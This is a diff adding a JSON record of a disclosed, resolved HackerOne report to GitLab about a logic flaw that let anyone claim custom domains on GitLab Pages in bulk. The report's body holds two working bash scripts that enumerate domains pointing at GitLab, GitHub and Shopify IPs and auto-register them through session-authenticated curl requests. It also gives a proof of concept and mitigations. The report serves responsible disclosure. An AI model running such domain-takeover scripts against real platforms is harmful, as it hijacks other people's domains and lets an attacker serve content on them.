@@ -1,0 +1,122 @@
+{
+  "id": 312118,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTIxMTg=",
+  "url": "https://hackerone.com/reports/312118",
+  "title": "Using GitLab to monitor and hijack domains in mass quantity.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-04T14:25:08.445Z",
+  "submitted_at": "2018-02-04T14:25:08.445Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "edoverflow",
+    "url": "/edoverflow",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-02-21T23:46:26.928Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-21T23:46:09.382Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Vulnerability Description\n\nThere is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to `52.167.214.135`. GitLab allows setting an unlimited number of domains for a single repository. \n\nFirst, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.\n\n```bash\n#!/bin/bash\n\nsearches=(\n    \"The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it.\"\n)\n\ngron \"https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 > whiteknight-temp\n\nwhile read domain; do\n    if host \"$domain\"> /dev/null; then\n        echo $domain;\n    fi;\ndone < whiteknight-temp >> domains\n\ncat domains | uniq | sed -e 's/^/https:\\/\\//' >> domains-to-test\n\nmeg / domains-to-test\n\nfor str in \"${searches[@]}\"; do\n    grep --color -Hnri \"$str\" out/\ndone\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=✓&authenticity_token=████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]\"\ndone < domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nThen I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to `52.167.214.135`, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.\n\n```bash\n#!/bin/bash\n\nIPS=(\n    # GitLab\n    \"52.167.214.135\"\n    # GitHub\n    \"192.30.252.153\"\n    \"192.30.252.154\"\n    # Shopify\n    \"23.227.38.32\"\n)\n\nfor ip in \"${IPS[@]}\"; do\n    gron \"https://app.securitytrails.com/api/search/by_type/ip/$ip\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 > whiteknight-temp\ndone\n\nwhile read domain; do\n    if host \"$domain\"> /dev/null; then\n        echo $domain;\n    fi;\ndone < whiteknight-temp >> domains\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=✓&authenticity_token=███████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]\"\ndone < domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nPlease note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use `securitytrails.com` to demonstrate the issue without affecting your users.\n\n# Proof of concept\n\nWith my colleague's permission, I asked them to set an A record for their personal domain (http://danfield.photography/) pointing to `52.167.214.135`. They set the A record **after** I had added their domain to my repository. After a couple of minutes, their domain was serving my repository's content.\n\n# Mitigation\n\nSince this is a logic flaw, there will be multiple ways to mitigate the issue.\n\n1. You could restrict repositories to only a single custom domain — this is what GitHub does.\n2. Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.\n3. Not store the domain until it actually points to `52.167.214.135` — currently you store any domain pointing to various other services and IPs.\n\n## Impact\n\nGitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-03-23T23:46:09.454Z",
+  "allow_singular_disclosure_after": -256491871.4248872,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "jokebookservice1",
+    "sp1d3rs",
+    "fdeleite",
+    "ramsexy",
+    "bogdantc",
+    "europa",
+    "muon4",
+    "yumi",
+    "bl4de",
+    "mohaned0101",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
